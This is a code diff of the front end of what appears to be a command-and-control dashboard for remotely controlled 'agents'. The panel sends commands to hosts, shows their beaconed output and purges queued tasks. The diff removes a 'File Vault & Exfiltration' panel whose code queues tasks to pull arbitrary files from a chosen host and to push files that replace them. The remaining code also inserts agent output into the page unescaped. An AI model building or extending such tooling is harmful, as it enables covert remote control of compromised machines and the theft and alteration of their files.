@@ -141,17 +141,6 @@
             background: rgba(255,255,255,.08);
         }
 
-        .file-editor {
-            background: #080809;
-            color: var(--success);
-            border: 1px solid var(--line);
-            font-family: 'Consolas', monospace;
-            width: 100%;
-            height: 300px;
-            outline: none;
-            padding: 10px;
-            border-radius: 4px;
-        }
     </style>
 </head>
 <body>
@@ -255,40 +244,9 @@
         <div id="results-feed" class="terminal" style="max-height:500px"></div>
     </div>
 
-    <div class="panel mt-3">
-        <div class="d-flex justify-content-between align-items-center mb-2">
-            <strong>File Vault & Exfiltration</strong>
-            <div class="d-flex gap-2">
-                <input type="text" id="vault-path" class="form-control form-control-sm" placeholder="Full path (e.g. /etc/hosts)" style="width: 300px;">
-                <button class="btn btn-sm btn-outline-custom" onclick="vaultOp('pull')">Pull File</button>
-                <button class="btn btn-sm btn-light" onclick="vaultOp('push')">Push & Replace</button>
-                <button class="btn btn-sm btn-outline-danger" onclick="abandonVaultOperation()">Abandon Operation</button>
-            </div>
-        </div>
-        <div class="row g-2">
-            <div class="col-md-12">
-                <textarea id="vault-editor" class="file-editor" placeholder="File content will appear here after a successful Pull..."></textarea>
-            </div>
-        </div>
-    </div>
 </div>
 
 <script>
-    const vaultState = {
-        pendingPullHost: null,
-        pendingPullPath: null,
-        editorDirty: false,
-        lastAppliedResultId: null,
-    };
-
-    function b64ToUtf8(input) {
-        try {
-            return decodeURIComponent(escape(atob(input)));
-        } catch {
-            try { return atob(input); } catch { return ''; }
-        }
-    }
-
     function osChipClass(family) {
         if (family === 'WINDOWS') return 'windows';
         if (family === 'LINUX') return 'linux';
@@ -333,8 +291,6 @@
 
     function selectAgent(hostname) {
         document.getElementById('target-select').value = hostname;
-        const vaultPath = document.getElementById('vault-path');
-        vaultPath.placeholder = `Path on ${hostname} (e.g. /etc/hosts)`;
         document.getElementById('cmd-input').focus();
         updateDashboard();
     }
@@ -349,56 +305,6 @@
 
     async function purgeQueue() {
         await fetch('/admin/purge_tasks', { method: 'POST' });
-        updateDashboard();
-    }
-
-    function abandonVaultOperation() {
-        vaultState.pendingPullHost = null;
-        vaultState.pendingPullPath = null;
-        document.getElementById('vault-path').value = '';
-        document.getElementById('vault-editor').value = '';
-        vaultState.editorDirty = false;
-        vaultState.lastAppliedResultId = null;
-        document.getElementById('vault-path').placeholder = 'Full path (e.g. /etc/hosts)';
-    }
-
-    async function vaultOp(op) {
-        const host = document.getElementById('target-select').value;
-        const path = document.getElementById('vault-path').value.trim();
-        const content = document.getElementById('vault-editor').value;
-
-        if (host === "ALL" || !path) {
-            alert("Select a specific agent and provide a file path.");
-            return;
-        }
-
-        const body = new FormData();
-        body.append('hostname', host);
-        body.append('path', path);
-        body.append('op', op);
-        if (op === 'push') body.append('content', content);
-
-        const res = await fetch('/admin/file_op', { method: 'POST', body });
-        if (!res.ok) {
-            alert(`File op failed (${res.status}).`);
-            return;
-        }
-
-        if (op === 'pull') {
-            vaultState.pendingPullHost = host;
-            vaultState.pendingPullPath = path;
-            vaultState.editorDirty = false;
-            alert("Pull task queued. Wait for next beacon and file will load automatically.");
-        } else {
-            alert("Push task queued. File will be replaced on next beacon.");
-            document.getElementById('vault-path').value = '';
-            document.getElementById('vault-editor').value = '';
-            vaultState.editorDirty = false;
-            vaultState.pendingPullHost = null;
-            vaultState.pendingPullPath = null;
-            vaultState.lastAppliedResultId = null;
-        }
-
         updateDashboard();
     }
 
@@ -463,38 +369,6 @@
         });
     }
 
-    function maybeApplyFileResult(result) {
-        const output = result.output || '';
-        const editor = document.getElementById('vault-editor');
-
-        if (output.startsWith('FILE_DATA_B64|')) {
-            const parts = output.split('|');
-            if (parts.length >= 3) {
-                const hostMatch = !vaultState.pendingPullHost || vaultState.pendingPullHost === result.hostname;
-                const pathDecoded = b64ToUtf8(parts[1]).trim();
-                const pathMatch = !vaultState.pendingPullPath || vaultState.pendingPullPath === pathDecoded;
-                const sameResultAlreadyApplied = vaultState.lastAppliedResultId === result.id;
-
-                if (hostMatch && pathMatch && !vaultState.editorDirty && !sameResultAlreadyApplied) {
-                    editor.value = b64ToUtf8(parts[2]);
-                    vaultState.lastAppliedResultId = result.id;
-                    vaultState.pendingPullHost = null;
-                    vaultState.pendingPullPath = null;
-                    vaultState.editorDirty = false;
-                    document.getElementById('vault-path').value = pathDecoded;
-                }
-            }
-        }
-
-        if (output.startsWith('FILE_ERROR_B64|') || output.startsWith('FILE_WRITE_ERROR_B64|')) {
-            const parts = output.split('|');
-            if (parts.length >= 3) {
-                const err = b64ToUtf8(parts[2]);
-                console.warn('File operation error:', err);
-            }
-        }
-    }
-
     function renderResults(results) {
         const el = document.getElementById('results-feed');
         if (!results.length) {
@@ -503,7 +377,6 @@
         }
         el.innerHTML = '';
         results.forEach(r => {
-            maybeApplyFileResult(r);
             el.innerHTML += `<div class="item"><div class="d-flex justify-content-between"><div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div><span class="subtle">${r.timestamp}</span></div><pre class="result-out">${r.output}</pre></div>`;
         });
     }
@@ -538,10 +411,6 @@
         const res = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
         if (res.ok) e.target.reset();
         updateDashboard();
-    });
-
-    document.getElementById('vault-editor').addEventListener('input', () => {
-        vaultState.editorDirty = true;
     });
 
     setInterval(() => { document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
